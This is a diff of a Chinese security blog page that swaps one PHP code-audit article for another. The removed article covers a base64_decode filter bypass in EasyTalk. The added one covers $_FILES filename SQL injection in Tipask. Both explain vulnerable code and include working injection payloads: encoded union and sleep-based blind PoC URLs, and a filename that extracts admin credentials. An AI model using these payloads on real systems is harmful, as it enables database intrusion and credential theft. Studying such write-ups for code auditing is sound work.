@@ -83,22 +83,17 @@
 
 
 
-<meta name="description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。漏洞来源于乌云：http://www.wooyun.org/bugs/wooyun-2014-050338">
+<meta name="description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇http://www.cnbraid.com/2016/04/29/sql5/，这里介绍另外两种情况。盲点如下：①FILES注入，全局只转义掉GET、POST和COOKIE传来的参数，遗漏了FILES且不受GPC；②变量覆">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode">
-<meta property="og:url" content="http://www.cnbraid.com/2016/02/18/sql2/index.html">
+<meta property="og:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇">
+<meta property="og:url" content="http://www.cnbraid.com/2016/05/10/sql6/index.html">
 <meta property="og:site_name" content="Braid's Blog">
-<meta property="og:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。漏洞来源于乌云：http://www.wooyun.org/bugs/wooyun-2014-050338">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql2_1.png">
-<meta property="og:updated_time" content="2016-05-03T07:00:32.541Z">
+<meta property="og:description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇http://www.cnbraid.com/2016/04/29/sql5/，这里介绍另外两种情况。盲点如下：①FILES注入，全局只转义掉GET、POST和COOKIE传来的参数，遗漏了FILES且不受GPC；②变量覆">
+<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql6_01.jpg">
+<meta property="og:updated_time" content="2016-05-10T05:31:00.220Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode">
-<meta name="twitter:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。漏洞来源于乌云：http://www.wooyun.org/bugs/wooyun-2014-050338">
+<meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇">
+<meta name="twitter:description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇http://www.cnbraid.com/2016/04/29/sql5/，这里介绍另外两种情况。盲点如下：①FILES注入，全局只转义掉GET、POST和COOKIE传来的参数，遗漏了FILES且不受GPC；②变量覆">
 
 
 
@@ -116,7 +111,7 @@
   };
 </script>
 
-  <title> 【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode | Braid's Blog </title>
+  <title> 【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇 | Braid's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -256,7 +251,7 @@
             
             
               
-                【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode
+                【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇
               
             
           </h1>
@@ -268,8 +263,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-02-18T10:35:00+08:00" content="2016-02-18">
-              2016-02-18
+            <time itemprop="dateCreated" datetime="2016-05-10T10:35:00+08:00" content="2016-05-10">
+              2016-05-10
             </time>
           </span>
 
@@ -298,8 +293,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/02/18/sql2/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/02/18/sql2/" itemprop="commentsCount"></span>
+                <a href="/2016/05/10/sql6/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/10/sql6/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -309,7 +304,7 @@
 
           
           
-             <span id="/2016/02/18/sql2/" class="leancloud_visitors" data-flag-title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode">
+             <span id="/2016/05/10/sql6/" class="leancloud_visitors" data-flag-title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -330,16 +325,13 @@
       
 
       
-        <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。<br><strong>漏洞来源于乌云：<a href="http://www.wooyun.org/bugs/wooyun-2014-050338" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-050338</a></strong><br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg" alt=""><br><a id="more"></a></p>
-<h2 id="0x02_环境搭建">0x02 环境搭建</h2><p>看背景我们使用了低版本的easytalk程序，版本为X2.4<br>①源码我打包了一份：<a href="http://pan.baidu.com/s/1bopOFNL" title="easytalk.zip" target="_blank" rel="external">http://pan.baidu.com/s/1bopOFNL</a><br>②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png" alt=""></p>
-<h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><p>首先看下源码结构，用的ThinkPHP框架，比较复杂：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png" alt=""><br>有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：<br>1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@access</span> public</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@param</span> string $string 要处理的字符串</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@return</span> string</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addSlashes</span><span class="params">(<span class="variable">$string</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数auth进行base64_decode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg" alt=""><br>3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//认证电子邮件</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doauth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="variable">$_authmsg</span>=daddslashes(<span class="variable">$_GET</span>[<span class="string">'auth'</span>]);<span class="comment">//再次判断GPC是否开启并进行注入过滤</span></span><br><span class="line">    <span class="variable">$authmsg</span>=base64_decode(<span class="variable">$_authmsg</span>);<span class="comment">//base64_decode函数对参数进行转码处理</span></span><br><span class="line">    <span class="variable">$tem</span>=explode(<span class="string">":"</span>,<span class="variable">$authmsg</span>);<span class="comment">//对解码后的参数authmsg按照“：”进行分割存入数组tem中</span></span><br><span class="line">    <span class="variable">$send_id</span>=<span class="variable">$tem</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$user</span>=M(<span class="string">'Users'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$user</span>-&gt;field(<span class="string">'mailadres,auth_email'</span>)-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;find();<span class="comment">//带入查询，在where子句里，造成注入</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_authmsg</span>==<span class="variable">$row</span>[<span class="string">'auth_email'</span>]) &#123;</span><br><span class="line">        <span class="variable">$user</span>-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;setField(<span class="string">'auth_email'</span>,<span class="number">1</span>);</span><br><span class="line">        setcookie(<span class="string">'setok'</span>, json_encode(<span class="keyword">array</span>(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail6'</span>),<span class="string">'ico'</span>=&gt;<span class="number">1</span>)),<span class="number">0</span>,<span class="string">'/'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setcookie(<span class="string">'setok'</span>, json_encode(<span class="keyword">array</span>(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail7'</span>),<span class="string">'ico'</span>=&gt;<span class="number">2</span>)),<span class="number">0</span>,<span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">'location:'</span>.SITE_URL.<span class="string">'/?m=setting&amp;a=mailauth'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>构造获取数据库相关信息的POC：</p>
-<pre><code><span class="string">http:</span><span class="comment">//localhost/eazytalk/?m=setting&amp;a=doauth&amp;auth=aGFja2luZycgdW5pb24gc2VsZWN0IHVzZXIoKSwyIw==</span>
-</code></pre><p>查看sql语句发现成功执行：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg" alt=""><br>发现这里是一个盲注，并没有输出，所以我们使用sql盲注的语句。获取当前数据库用户名的第一个字符是不是‘r’（ascii值为114）的POC：</p>
-<pre><code><span class="string">http:</span><span class="comment">//localhost/eazytalk/?m=index&amp;a=mailactivity&amp;auth=MicgYW5kIChzZWxlY3QgaWYoKGFzY2lpKHN1YnN0cmluZygoc2VsZWN0IHVzZXIoKSksMSwxKSkgPSAxMTQpLHNsZWVwKDUpLDApKSM=</span>
-</code></pre><p>页面持续了5秒，说明user()的第一个字符为‘r’，查看sql语句发现成功执行：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql2_1.png" alt=""><br>最后，有兴趣的同学可以自己写个py脚本来跑这种盲注。</p>
-<p>本文由HackBraid整理总结，如需转载请联系作者。</p>
+        <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇<a href="http://www.cnbraid.com/2016/04/29/sql5/">http://www.cnbraid.com/2016/04/29/sql5/</a>，这里介绍另外两种情况。<br><strong>盲点如下：</strong><br>①FILES注入，全局只转义掉GET、POST和COOKIE传来的参数，遗漏了FILES且不受GPC；<br>②变量覆盖，危险函数：extract()、parse_str()、$$。<br><a id="more"></a></p>
+<h2 id="0x02_漏洞分析">0x02 漏洞分析</h2><h3 id="FILES注入">FILES注入</h3><p>FILES注入一般情况是是因为上传时把上传的名字带到insert入库产生的，这里看下tipask问答系统<br>首先看看它的全局防护是怎么处理的：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php里:</span><br><span class="line"><span class="keyword">include</span> TIPASK_ROOT . <span class="string">'/model/tipask.class.php'</span>;</span><br><span class="line"><span class="variable">$tipask</span> = <span class="keyword">new</span> tipask();</span><br><span class="line"><span class="variable">$tipask</span>-&gt;run();</span><br><span class="line">... ...</span><br><span class="line">跟进到/model/tipask.class.php里:</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_request</span><span class="params">()</span> </span>&#123;</span><br><span class="line">... ...</span><br><span class="line">        <span class="variable">$this</span>-&gt;get = taddslashes(<span class="variable">$this</span>-&gt;get, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;post = taddslashes(array_merge(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>));</span><br><span class="line">        checkattack(<span class="variable">$this</span>-&gt;post, <span class="string">'post'</span>);</span><br><span class="line">        checkattack(<span class="variable">$this</span>-&gt;get, <span class="string">'get'</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到对get和post传来的数据进行了addslashes特殊转义处理，对$_FILES没有任何处理操作，我们全局搜索$_FILES，发现/control/attach.php有上传处理，我们跟进：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onupload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//上传配置</span></span><br><span class="line">	<span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">"uploadPath"</span> =&gt; <span class="string">"data/attach/"</span>, <span class="comment">//保存路径</span></span><br><span class="line">		<span class="string">"fileType"</span> =&gt; <span class="keyword">array</span>(<span class="string">".rar"</span>, <span class="string">".doc"</span>, <span class="string">".docx"</span>, <span class="string">".zip"</span>, <span class="string">".pdf"</span>, <span class="string">".txt"</span>, <span class="string">".swf"</span>, <span class="string">".wmv"</span>, <span class="string">"xsl"</span>), <span class="comment">//文件允许格式</span></span><br><span class="line">		<span class="string">"fileSize"</span> =&gt; <span class="number">10</span> <span class="comment">//文件大小限制，单位MB</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//文件上传状态,当成功时返回SUCCESS，其余值将直接返回对应字符窜</span></span><br><span class="line">	<span class="variable">$state</span> = <span class="string">"SUCCESS"</span>;</span><br><span class="line">	<span class="variable">$clientFile</span> = <span class="variable">$_FILES</span>[<span class="string">"upfile"</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$clientFile</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&#123;'state':'文件大小超出服务器配置！','url':'null','fileType':'null'&#125;"</span>; <span class="comment">//请修改php.ini中的upload_max_filesize和post_max_size</span></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//格式验证</span></span><br><span class="line">	<span class="variable">$current_type</span> = strtolower(strrchr(<span class="variable">$clientFile</span>[<span class="string">"name"</span>], <span class="string">'.'</span>));</span><br><span class="line">	<span class="keyword">if</span> (!in_array(<span class="variable">$current_type</span>, <span class="variable">$config</span>[<span class="string">'fileType'</span>])) &#123;</span><br><span class="line">		<span class="variable">$state</span> = <span class="string">"不支持的文件类型！"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//大小验证</span></span><br><span class="line">	<span class="variable">$file_size</span> = <span class="number">1024</span> * <span class="number">1024</span> * <span class="variable">$config</span>[<span class="string">'fileSize'</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$clientFile</span>[<span class="string">"size"</span>] &gt; <span class="variable">$file_size</span>) &#123;</span><br><span class="line">		<span class="variable">$state</span> = <span class="string">"文件大小超出限制！"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//保存文件</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$state</span> == <span class="string">"SUCCESS"</span>) &#123;</span><br><span class="line">		<span class="variable">$targetfile</span> = <span class="variable">$config</span>[<span class="string">'uploadPath'</span>] . gmdate(<span class="string">'ym'</span>, <span class="variable">$this</span>-&gt;time) . <span class="string">'/'</span> . random(<span class="number">8</span>) . strrchr(<span class="variable">$clientFile</span>[<span class="string">"name"</span>], <span class="string">'.'</span>);</span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$_ENV</span>[<span class="string">'attach'</span>]-&gt;movetmpfile(<span class="variable">$clientFile</span>, <span class="variable">$targetfile</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">			<span class="variable">$state</span> = <span class="string">"文件保存失败！"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//这里将上传的文件名带入数据库查询</span></span><br><span class="line">			<span class="variable">$_ENV</span>[<span class="string">'attach'</span>]-&gt;add(<span class="variable">$clientFile</span>[<span class="string">"name"</span>], <span class="variable">$current_type</span>, <span class="variable">$clientFile</span>[<span class="string">"size"</span>], <span class="variable">$targetfile</span>, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//向浏览器返回数据json数据</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&#123;"state":"'</span> . <span class="variable">$state</span> . <span class="string">'","url":"'</span> . <span class="variable">$targetfile</span> . <span class="string">'","fileType":"'</span> . <span class="variable">$current_type</span> . <span class="string">'","original":"'</span> . <span class="variable">$clientFile</span>[<span class="string">"name"</span>] . <span class="string">'"&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这句$_ENV[‘attach’]-&gt;add($clientFile[“name”]…)，将$clientFile[name] = $_FILES[“upfile”][name]带入了如下add入库的操作，从而造成注入。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(<span class="variable">$filename</span>,<span class="variable">$ftype</span>,<span class="variable">$fsize</span>,<span class="variable">$location</span>,<span class="variable">$isimage</span>=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">	<span class="variable">$uid</span>=<span class="variable">$this</span>-&gt;base-&gt;user[<span class="string">'uid'</span>];</span><br><span class="line">	<span class="variable">$this</span>-&gt;db-&gt;query(<span class="string">"INSERT INTO "</span>.DB_TABLEPRE.<span class="string">"attach(time,filename,filetype,filesize,location,isimage,uid)  VALUES (&#123;$this-&gt;base-&gt;time&#125;,'$filename','$ftype','$fsize','$location',$isimage,$uid)"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$this</span>-&gt;db-&gt;insert_id();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上传一个文件，然后修改文件名称为以下代码即可获取管理员账户密码：</p>
+<pre><code>filename="1','.php',1,(<span class="operator">select <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> ask_user <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)#.jpg<span class="string">"</span></span>
+</code></pre><p>数据库里成功将管理员账户密码插入到attach表中：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql6_01.jpg" alt=""></p>
 
       
     </div>
@@ -367,17 +359,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/12/24/sql1/" rel="next" title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode">
-                <i class="fa fa-chevron-left"></i> 【PHP代码审计】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode
+              <a href="/2016/04/29/sql5/" rel="next" title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 6.全局防护盲点的总结上篇">
+                <i class="fa fa-chevron-left"></i> 【PHP代码审计】 那些年我们一起挖掘SQL注入 - 6.全局防护盲点的总结上篇
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/02/19/sql3/" rel="prev" title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 4.全局防护Bypass之二次注入">
-                【PHP代码审计】 那些年我们一起挖掘SQL注入 - 4.全局防护Bypass之二次注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -403,8 +391,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/02/18/sql2/"
-           data-title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode" data-url="http://www.cnbraid.com/2016/02/18/sql2/">
+      <div class="ds-thread" data-thread-key="2016/05/10/sql6/"
+           data-title="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇" data-url="http://www.cnbraid.com/2016/05/10/sql6/">
       </div>
     
   </div>
@@ -537,7 +525,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_背景"><span class="nav-number">1.</span> <span class="nav-text">0x01 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_环境搭建"><span class="nav-number">2.</span> <span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03_漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">0x03 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04_漏洞证明"><span class="nav-number">4.</span> <span class="nav-text">0x04 漏洞证明</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_背景"><span class="nav-number">1.</span> <span class="nav-text">0x01 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FILES注入"><span class="nav-number">2.1.</span> <span class="nav-text">FILES注入</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
